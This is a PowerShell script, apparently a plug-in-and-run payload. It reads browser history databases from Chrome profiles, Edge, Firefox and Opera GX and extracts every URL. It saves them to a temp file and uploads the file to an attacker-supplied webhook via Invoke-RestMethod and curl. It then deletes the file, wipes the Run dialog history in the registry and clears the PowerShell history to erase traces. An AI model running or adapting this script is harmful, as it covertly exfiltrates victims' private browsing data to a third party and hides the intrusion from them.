$browsers=@(
    [pscustomobject]@{
        Browser = 'chrome'
        DataType = 'history - Profile 1'
        Path="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 1\history"
    }
    [pscustomobject]@{
        Browser = 'chrome'
        DataType = 'history - Profile 2'
        Path="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 2\history"
    }
    [pscustomobject]@{
        Browser = 'chrome'
        DataType = 'history - Profile 3'
        Path="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 3\history"
    }
    [pscustomobject]@{
        Browser = 'chrome'
        DataType = 'history - Profile 4'
        Path="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 4\history"
    }
    [pscustomobject]@{
        Browser = 'chrome'
        DataType = 'history - Profile 5'
        Path="$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Profile 5\history"
    }
    [pscustomobject]@{
        Browser = 'edge'
        DataType = 'history'
        Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    }
    [pscustomobject]@{
        Browser = 'firefox'
        DataType = 'history'
        Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    }
    [pscustomobject]@{
        Browser = 'opera'
        DataType = 'history'
        Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    }
)

$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
function Get-BrowserData{
    foreach ($browser in $browsers){
        $Value = Get-Content -Path $browser.Path | Select-String -AllMatches $regex | ForEach-Object {($_.Matches).Value} | Sort-Object -Unique
        $Value | ForEach-Object {
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $browser.Browser
                DataType = $browser.DataType
                Data = $_
            }
        }
    }
}

function upload{
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )
    $hookurl = "$d"
    $Body = @{
    'username' = $env:username
    'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

Get-BrowserData >> $env:TMP\--BrowserHistory.txt
upload -file $env:TMP\--BrowserHistory.txt
Remove-Item $env:TEMP/--BrowserHistory.txt

# Cleanup self
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Clear-History
